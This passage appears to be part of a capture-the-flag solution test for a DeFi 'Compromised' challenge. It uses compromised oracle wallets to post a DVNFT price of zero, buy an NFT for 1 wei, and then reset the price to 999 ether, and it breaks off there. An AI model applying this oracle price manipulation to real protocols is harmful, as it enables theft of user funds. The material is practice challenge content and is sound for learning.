...
describe('Compromised challenge', function () {
    ...
    it('Execution', async function () {
        ...
        await oracle.connect(oraclesWallets[0]).postPrice("DVNFT", 0);
        await oracle.connect(oraclesWallets[1]).postPrice("DVNFT", 0);

        await exchange.connect(player).buyOne({ value: 1});

        await oracle.connect(oraclesWallets[0]).postPrice("DVNFT",  ethers.utils.parseEther("999"));
        await oracle.connect(oraclesWallets[1]).postPrice("DVNFT",  ethers.utils.parseEther("999"));
